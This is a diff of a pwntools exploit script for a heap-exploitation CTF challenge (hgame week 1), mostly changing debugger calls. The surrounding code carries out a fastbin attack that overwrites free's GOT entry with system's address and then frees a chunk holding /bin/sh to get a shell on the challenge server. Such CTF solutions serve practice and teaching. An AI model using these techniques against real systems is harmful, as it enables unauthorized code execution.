@@ -8,7 +8,7 @@ gdb_is = 0
 context(arch='amd64',os = 'linux', log_level='DEBUG')
 if debug:
     context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
-    r = process("./vuln")
+    r = gdb.debug('./vuln', 'set debug-file-directory debug/')
 else:
     host = "week-1.hgame.lwsec.cn"
     r = connect(host,30709)#远程连接
@@ -59,14 +59,14 @@ print(f'libc_addr = {hex(libc_addr)}')
 print(f'system_addr = {hex(system_addr)}')
 print(f'free_addr-8 = {hex(free_addr)}')
 
+
 add(5,0x50,p64(0x602002-8)) #向fastbin next写入free_got
-gdb.attach(r)
-pause()
+
 add(6,0x50,b'A'* 0x50)
 add(7,0x50,b'A'* 0x50)
-
+pause()
 add(8,0x50,b'\x00'*14+p64(system_addr)) #申请的fastbin指向free_got
-
+pause()
 delete(4)
 #free且传参/bin/sh
 r.interactive()
